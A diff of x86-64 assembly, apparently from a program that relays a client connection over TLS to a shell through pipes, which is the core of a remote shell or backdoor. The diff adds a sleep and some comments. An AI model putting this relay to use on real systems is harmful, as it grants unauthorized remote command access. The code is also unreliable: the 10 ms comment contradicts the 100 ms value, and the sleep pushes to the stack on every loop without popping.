@@ -1,12 +1,12 @@
 
-extern putnbr
-
 struc sockaddr_in
 	.family:	resw	1
 	.port:		resw	1
 	.addr:		resd	1
 	.zero 		resb	6
 endstruc
+
+%define IS_LITTLE_ENDIAN
 
 %define AF_INET 2
 %define SOCK_STREAM 1
@@ -45,6 +45,7 @@ endstruc
 %define SYS_SELECT 23
 %define SYS_WAIT4 61
 %define SYS_FCNTL 72
+%define SYS_NANOSLEEP 35
 
 %define F_GETFL 3
 %define F_SETFL 4
@@ -99,7 +100,9 @@ make_non_blocking:							; fd : edi
 
 htons:										; swap 2 first bytes of rdi
 	xor rax, rax 
+%ifdef IS_LITTLE_ENDIAN
 	ror di, 0x8
+%endif
 	mov ax, di								; TODO ifndef
 	ret
 
@@ -313,7 +316,7 @@ tls_loop:
 	cmp rax, 0x0
 	js finish_tls
 
-	mov edi, mcli_fd
+	mov edi, mcli_fd						; make fds non block
 	call make_non_blocking
 	mov edi, DWORD [mpipesfd_in + 0x4]
 	call make_non_blocking
@@ -321,6 +324,17 @@ tls_loop:
 	call make_non_blocking
 
 read_write_loop:
+
+	mov rax, SYS_NANOSLEEP					; Loop each 10 ms
+	mov rdi, 100000000
+	push rdi 
+	mov rdi, 0
+	push rdi
+	mov rdi, rsp
+	mov rsi, 0x0
+	syscall									; nanosleep({0, 100000000}, NULL)
+	cmp rax, 0x0
+	js finish_tls							
 
 	test rbuffshell_size, rbuffshell_size	; if (rbuffshell_size != 0)
 	jz .read_from_shell
@@ -373,11 +387,11 @@ read_write_loop:
 	test rbuffcli_size, rbuffcli_size		; if (rbuffcli_size != 0)
 	jz .read_from_cli
 
-	mov rax, SYS_WRITE
+	mov rax, SYS_WRITE						; write to shell
 	mov edi, [mpipesfd_in + 0x4]
 	mov rsi, rbuffcli
 	mov rdx, rbuffcli_size
-	syscall
+	syscall									; write(mpipesfd_in[1], rbuffcli, rbuffcli_size)
 	cmp rax, EAGAIN
 	je .skip_block_ws
 	cmp rax, 0x0
